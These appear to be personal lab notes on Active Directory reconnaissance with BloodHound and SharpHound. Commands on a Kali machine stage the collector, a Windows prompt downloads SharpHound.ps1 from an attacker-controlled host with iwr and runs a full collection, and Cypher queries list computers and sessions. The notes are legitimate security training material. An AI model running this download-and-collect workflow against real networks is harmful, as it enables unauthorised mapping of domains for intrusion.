start db
```
sudo neo4j start
```

start it
```
bloodhound
```


# The version recommended, located in my kali - SharpHound-v1.0.4
```
┌──(kali㉿kali)-[~/Medtech-Challenge1/Medtech121]
└─$ cp /home/kali/tools/SharpHound-v1.0.4/SharpHound.ps1 .
```

```
PS C:\Users\marcus> iwr -uri http://192.168.45.175:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.45.175:8000/SharpHound.ps1 -Outfile SharpHound.ps1
```

```
PS C:\Tools> Import-Module .\Sharphound.ps1
PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\ -OutputPrefix "medtech audit"
```

# This is the default embedded on kali SharpHound
serving SharpHound.ps1
```
┌──(kali㉿kali)-[~/AssemblingthePieces/beyond]
└─$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

```
PS C:\Users\marcus> iwr -uri http://192.168.45.175:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.45.175:8000/SharpHound.ps1 -Outfile SharpHound.ps1
```


# Analyzing result

Custom query to display all computers
```
MATCH (m:Computer) RETURN m
```

Custom query to display all active sessions
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```